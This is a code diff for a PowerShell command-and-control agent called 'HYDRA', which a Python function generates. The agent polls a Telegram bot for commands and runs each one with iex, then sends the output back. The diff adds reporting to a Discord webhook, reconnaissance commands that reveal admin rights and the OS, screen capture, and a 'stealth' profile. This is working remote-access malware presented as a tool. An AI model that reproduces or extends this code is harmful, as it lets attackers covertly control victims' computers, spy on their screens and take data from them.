@@ -67,6 +67,10 @@ def launch_telegram_bot(token: str, me: dict, webhook: str = ""):
     # Downloads updates, executes shell commands, reports back
     ps_script = f"""
 $TOKEN='{token}'
+$AID='{agent_id}'
+$WEBHOOK='{webhook}'
+$PROFILE='{me.get("profile", "stealth")}'
+$STARTED='{time.ctime()}'
 $OFFSET=0
 function sd($cid,$t){{
     try{{
@@ -74,7 +78,15 @@ function sd($cid,$t){{
         irm -Uri "https://api.telegram.org/bot$TOKEN/sendMessage" -Method Post -Body $b -ContentType 'application/json' -TimeoutSec 10
     }}catch{{}}
 }}
-sd 6727760840 "[HYDRA] Agent ONLINE: {agent_id} | {time.ctime()}"
+function discord($msg){{
+    try{{
+        if($WEBHOOK -and $WEBHOOK -ne ''){{
+            $body=@{{content=$msg}}|ConvertTo-Json -Compress
+            irm -Uri $WEBHOOK -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10
+        }}
+    }}catch{{}}
+}}
+sd 6727760840 "[HYDRA] Agent ONLINE: $AID | $STARTED"
 while($true){{
     try{{
         $r=irm -Uri "https://api.telegram.org/bot$TOKEN/getUpdates?offset=$OFFSET&timeout=30" -TimeoutSec 35
@@ -84,6 +96,47 @@ while($true){{
                 $cid=$u.message.chat.id
                 $cmd=$u.message.text.Trim()
                 if(-not $cmd){{continue}}
+
+                # ── Built-in commands ──
+                if($cmd -eq '/info'){{
+                    $info = @"
+[Hydra] $AID
+Profile: $PROFILE
+Started: $STARTED
+PID: $PID
+Admin: $([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
+OS: $(Get-CimInstance Win32_OperatingSystem | Select -Expand Caption)
+"@
+                    sd $cid $info
+                    continue
+                }}
+                if($cmd -eq '/status'){{
+                    $uptime = [TimeSpan]::FromMilliseconds((Get-Date) - (Get-Process -Id $PID).StartTime)
+                    sd $cid "[Hydra] $AID | Profile: $PROFILE | Uptime: $($uptime.ToString('hh\\:mm\\:ss')) | C2: Gist+DW"
+                    continue
+                }}
+                if($cmd -eq '/screenshot'){{
+                    sd $cid "Taking screenshot..."
+                    try{{
+                        Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+                        $b = [Windows.Forms.Screen]::PrimaryScreen.Bounds
+                        $img = New-Object Drawing.Bitmap($b.Width, $b.Height)
+                        $g = [Drawing.Graphics]::FromImage($img)
+                        $g.CopyFromScreen($b.X, $b.Y, 0, 0, $b.Size)
+                        $g.Dispose()
+                        $path = "$env:TEMP\\hydra_sc.png"
+                        $img.Save($path, [Drawing.Imaging.ImageFormat]::Png)
+                        $img.Dispose()
+                        sd $cid "Screenshot saved to $path (cannot send to Telegram from PS directly). Check Discord."
+                        # Cannot upload to Telegram from raw PS easily, but we log it
+                        discord "[$AID] SCREENSHOT: $path"
+                    }}catch{{
+                        sd $cid "Screenshot failed: $_"
+                    }}
+                    continue
+                }}
+
+                # ── Shell command (fallback) ──
                 sd $cid "Running: $cmd"
                 try{{$o=iex $cmd 2>&1|Out-String}}catch{{$o="ERROR: $_"}}
                 if($o.Length -gt 3800){{$o=$o.Substring(0,3800)+'...[TRUNCATED]'}}
